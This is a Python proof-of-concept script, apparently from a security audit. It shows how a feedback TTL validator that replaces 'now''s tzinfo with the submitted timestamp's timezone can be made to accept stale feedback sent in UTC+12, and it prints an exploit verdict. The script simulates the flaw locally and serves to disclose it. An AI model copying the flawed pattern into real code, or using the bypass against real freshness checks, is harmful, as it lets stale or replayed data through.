#!/usr/bin/env python3
"""
Proof of Concept: Timezone Manipulation Bypass for Stale Feedback TTL

Demonstrates how an attacker can send old feedback in a different timezone
to bypass the FeedbackTTLValidator's TTL check.
"""

from datetime import datetime, timezone, timedelta


def main():
    print("=" * 70)
    print("PoC: Stale Feedback TTL Bypass via Timezone Manipulation")
    print("=" * 70)
    print()

    # Setup: Create a feedback timestamp that is 70 minutes old (violates 60-min TTL)
    utc_now = datetime.now(timezone.utc)
    feedback_utc_70min_old = utc_now - timedelta(minutes=70)

    print("1. CREATE STALE FEEDBACK")
    print("-" * 70)
    print(f"   Current UTC time: {utc_now.isoformat()}")
    print(f"   Feedback (70 min old, UTC): {feedback_utc_70min_old.isoformat()}")
    print()

    # Normal validation (correct)
    print("2. NORMAL VALIDATION (Correct)")
    print("-" * 70)
    now = datetime.now(timezone.utc)
    age_seconds = int((now - feedback_utc_70min_old).total_seconds())
    print(f"   Age: {age_seconds}s (exceeds max_age=3600s, should REJECT)")
    print(f"   Valid? {age_seconds <= 3600}")
    print()

    # Attack: Convert feedback to UTC+12 timezone (same absolute time, different local time)
    print("3. ATTACK: Express feedback in UTC+12")
    print("-" * 70)
    utc_plus_12 = timezone(timedelta(hours=12))
    feedback_in_utc_plus_12 = feedback_utc_70min_old.astimezone(utc_plus_12)
    print(f"   Feedback (70 min old, UTC+12): {feedback_in_utc_plus_12.isoformat()}")
    print(f"   (Same absolute time, different timezone expression)")
    print()

    # Simulate the vulnerable code
    print("4. VULNERABLE VALIDATOR LOGIC")
    print("-" * 70)
    print("   Code: now = datetime.now(timezone.utc).replace(tzinfo=feedback_time.tzinfo)")
    print()

    feedback_time = feedback_in_utc_plus_12
    now_utc = datetime.now(timezone.utc)

    # VULNERABLE: This is what the code does
    now_replaced = now_utc.replace(tzinfo=feedback_time.tzinfo)

    print(f"   now_utc: {now_utc.isoformat()}")
    print(f"   feedback_time: {feedback_time.isoformat()}")
    print()
    print(f"   now_replaced = now_utc.replace(tzinfo=UTC+12):")
    print(f"      = {now_replaced.isoformat()}")
    print()

    # Calculate age using the vulnerable logic
    age_delta = now_replaced - feedback_time
    age_seconds_vulnerable = int(age_delta.total_seconds())

    print(f"   age = {now_replaced.isoformat()} - {feedback_time.isoformat()}")
    print(f"       = {age_seconds_vulnerable}s")
    print()

    if age_seconds_vulnerable <= 3600:
        print(f"   VULNERABLE: {age_seconds_vulnerable}s <= 3600s → ACCEPT (WRONG!)")
        print()
        print("=" * 70)
        print("EXPLOIT SUCCESSFUL!")
        print("=" * 70)
        print(f"Attacker sent feedback that is 70 minutes old")
        print(f"Validator calculated age as {age_seconds_vulnerable}s (should be ~4200s)")
        print(f"Validator ACCEPTED stale feedback → TTL check BYPASSED")
        print()
        return True
    else:
        print(f"   SAFE: {age_seconds_vulnerable}s > 3600s → REJECT (CORRECT)")
        return False


if __name__ == "__main__":
    success = main()

    print()
    print("=" * 70)
    print("VERDICT")
    print("=" * 70)
    if success:
        print('{"vector": "stale_feedback_ttl", "exploitable": true, "severity": "HIGH"}')
    else:
        print('{"vector": "stale_feedback_ttl", "exploitable": false, "severity": "LOW"}')
